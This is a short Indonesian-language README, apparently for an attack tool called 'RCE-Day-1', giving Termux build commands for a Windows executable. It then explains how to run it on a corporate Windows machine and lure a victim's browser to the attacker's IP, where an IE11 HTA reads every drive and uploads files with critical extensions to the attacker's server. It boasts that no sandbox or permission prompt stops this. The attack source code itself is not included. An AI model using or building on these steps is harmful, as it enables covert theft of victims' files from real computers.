# RCE-Day-1
Tidak suka banyak gaya yang penting nyata

## Crooss Compiler To Termux
```pkg install xmake clang
xmake f -p cross -a x86_64 -m release

xmake create -n ie_rdot -l c++ -P .

# salin kode cpp ke src/main.cpp
xmake

# hasil: build/cross/x86_64/release/ie_rdot.exe
```
Bawa  ie_rdot.exe  ke Windows korporat. Jalankan → bind port 80.
 Browser korban:  http://YOUR_IP  → klik “Open document” → IE11 luncur, HTA otomatis jalan, baca semua drive, kirim nama+isi file bertarget ekstensi kritis ke  /up . Server console menampilkan path+size real-time.

 Selesai. Tidak ada sandbox, tidak ada popup permission. IE11 + HTA = full disk access via FSO.

 
